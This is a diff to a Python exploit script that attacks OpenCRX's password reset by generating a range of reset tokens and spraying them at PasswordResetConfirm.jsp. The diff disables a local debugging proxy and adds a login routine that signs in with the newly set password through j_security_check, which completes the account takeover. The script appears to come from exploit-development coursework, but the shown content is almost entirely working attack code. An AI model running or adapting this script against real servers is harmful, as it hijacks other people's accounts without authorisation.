@@ -76,11 +76,11 @@ def generate_tokens(low, high):
 def resetPassword(ip, username, password, tokens):
 	s = requests.Session()
 
-	proxies = {
-		'http': 'http://127.0.0.1:8080',
-		'https': 'http://127.0.0.1:8080'
-	}
-	s.proxies.update(proxies)
+	# proxies = {
+	# 	'http': 'http://127.0.0.1:8080',
+	# 	'https': 'http://127.0.0.1:8080'
+	# }
+	# s.proxies.update(proxies)
 
 	target = f"http://{ip}:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
 
@@ -105,6 +105,31 @@ def resetPassword(ip, username, password, tokens):
 	print("Password not reset successfully")
 	exit(0)
 
+def login(ip, username, password):
+	s = requests.Session()
+
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
+
+	target = f"http://{ip}:8080/opencrx-core-CRX/j_security_check"
+	data = {
+		"j_username": username,
+		"j_password": password
+	}
+
+	r = s.post(target, data=data)
+	fail_element = "Login failed - Please try again"
+	if fail_element in r.text:
+		print("Login failure")
+		exit(0)
+
+	print(f"Succesfull logged in as user {username}")
+	return s
+
+
 def main():
 	if len(sys.argv) != 2:
 		print ("(+) usage: %s <target>" % sys.argv[0])
@@ -126,7 +151,10 @@ def main():
 	print(f"Generated {high-low+1} tokens")
 
 	print("Spraying tokens at target")
-	session = resetPassword(ip, username, password, tokens)
+	resetPassword(ip, username, password, tokens)
+
+	print("Logging in")
+	session = login(ip, username, password)
 
 if __name__ == '__main__':
 	main()
